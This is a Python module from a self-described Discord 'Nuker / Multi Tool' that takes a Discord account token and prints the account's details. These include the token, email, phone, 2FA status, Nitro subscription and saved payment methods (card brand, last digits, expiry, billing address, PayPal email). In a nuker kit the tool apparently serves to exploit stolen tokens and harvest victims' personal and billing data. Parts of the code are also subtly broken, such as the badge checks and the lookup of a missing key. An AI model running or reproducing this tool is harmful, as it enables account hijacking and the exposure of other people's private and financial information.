# Coded / Dev: ††#9999 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# GANG Discord Nuker / Multi Tool©
# Copyright © 2022
########################################

import os
import requests

from datetime import datetime
from pystyle import Colorate, Colors, Write

from utilities.Settings.common import getheaders
import getpass
username = getpass.getuser()

######################################################### MENU
x = "data/ignore/color.txt"
if os.path.exists(x):
    with open('data/ignore/color.txt', 'r')as file:
        for line in file:
            if "Colors.blue_to_cyan" in line:
                custom = Colors.blue_to_cyan
            if "Colors.blue_to_green" in line:
                custom = Colors.blue_to_green
            if "Colors.blue_to_purple" in line:
                custom = Colors.blue_to_purple
            if "Colors.blue_to_white" in line:
                custom = Colors.blue_to_white
            if "Colors.red_to_green" in line:
                custom = Colors.red_to_green
            if "Colors.red_to_purple" in line:
                custom = Colors.red_to_purple
            if "Colors.red_to_white" in line:
                custom = Colors.red_to_white
            if "Colors.red_to_yellow" in line:
                custom = Colors.red_to_yellow
            if "Colors.green_to_yellow" in line:
                custom = Colors.green_to_yellow
            if "Colors.cyan_to_blue" in line:
                custom = Colors.cyan_to_blue
            if "Colors.cyan_to_green" in line:
                custom = Colors.cyan_to_green

def Info(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}
    badges = ""

    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072

    flags = r.json()['flags']
    if (flags == Discord_Employee):
        badges += "Staff, "
    if (flags == Partnered_Server_Owner):
        badges += "Partner, "
    if (flags == HypeSquad_Events):
        badges += "Hypesquad Event, "
    if (flags == Bug_Hunter_Level_1):
        badges += "Green Bughunter, "
    if (flags == House_Bravery):
        badges += "Hypesquad Bravery, "
    if (flags == House_Brilliance):
        badges += "HypeSquad Brillance, "
    if (flags == House_Balance):
        badges += "HypeSquad Balance, "
    if (flags == Early_Supporter):
        badges += "Early Supporter, "
    if (flags == Bug_Hunter_Level_2):
        badges += "Gold BugHunter, "
    if (flags == Early_Verified_Bot_Developer):
        badges += "Verified Bot Developer, "
    if (badges == ""):
        badges = "None"

    userName = r.json()['username'] + '#' + r.json()['discriminator']
    userID = r.json()['id']
    phone = r.json()['phone']
    email = r.json()['email']
    language = r.json()['locale']
    mfa = r.json()['mfa_enabled']
    avatar_id = r.json()['avatar']
    has_nitro = False
    res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token))
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
    creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

    if has_nitro:
        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)

    #dict
    billing_info = []
    #for key (x) in dict (requests)
    for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=getheaders(token)).json():
        
        # y = x
        y = x['billing_address']
        name = y['name']
        address_1 = y['line_1']
        address_2 = y['line_2']
        city = y['city']
        postal_code = y['postal_code']
        state = y['state']
        country = y['country']
        if x['type'] == 1:
            cc_brand = x['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = x['last_4']
            cc_month = str(x['expires_month'])
            cc_year = str(x['expires_year'])
            data = {
                'calword@type': 'Credit Card',
                'calword@name': name,
                'calword@date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                'calword@brand': cc_brand.title(),
                'calword@number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                'calword@country': country,
                'calword@state': state if state else 'None',
                'calword@adr1': address_1,
                'calword@adr2': address_2 if address_2 else 'None',
                'calword@city': city,
                'calword@zip': postal_code,
                'calword@vaild': not x['invalid'],
                'calword@default': x['default']
            }
        elif x['type'] == 2:
            data = {
                'calword@type': 'PayPal',
                'calword@name': name,
                'calword@mail': x['email'],
                'calword@country': country,
                'calword@state': state if state else 'None',
                'calword@adr1': address_1,
                'calword@adr2': address_2 if address_2 else 'None',
                'calword@city': city,
                'calword@zip': postal_code,
                'calword@vaild': not x['invalid'],
                'calword@default': x['default']
            }
        billing_info.append(data)
        
    print(Colorate.Horizontal(custom, f"""          ╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╮
           [calword@token] </> {token}
           [calword@user] </> {userName} / {userID}
           [calword@badge] </> {badges} 
           [calword@phone] </> {phone if phone else "None"}
           [calword@mail] </> {email}
           [calword@date] </> {creation_date}
           [calword@lan] </> {language} 
           [calword@2fa] </> {mfa}
          
           [calword@nitro] </> {has_nitro}
           [calword@left] </> {days_left if has_nitro else "0"} days"""))
# [calword@pfp] </> {avatar_url if avatar_id else "None"}
    Write.Print(f"          ┢╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼┩""", custom, interval=0.000)
    if len(billing_info) > 0:
        if len(billing_info) == 1:
            for x in billing_info:
                for key, val in x.items():
                    if not val:
                        continue
                    Write.Print(f"\n           ["+'{:<19}{}'.format(key+"] </>", val), custom, interval=0.000)
                    
        else:
            for i, x in enumerate(billing_info):
                title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                print('' + title)
                print('' + ('=' * len(title)))
                for j, (key, val) in enumerate(x.items()):
                    if not val or j == 0:
                        continue
                    Write.Print(f"\n           ["+'{:<19}{}'.format(key+"] </>", val), custom, interval=0.000)
                if i < len(billing_info) - 1:
                    print(f'')
        print(f'')
        Write.Print(f"          ╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯", custom, interval=0.000)
    Write.Input(f'\n          [calword@{username}] <~> Press anything to go back.', custom, interval=0.0025)
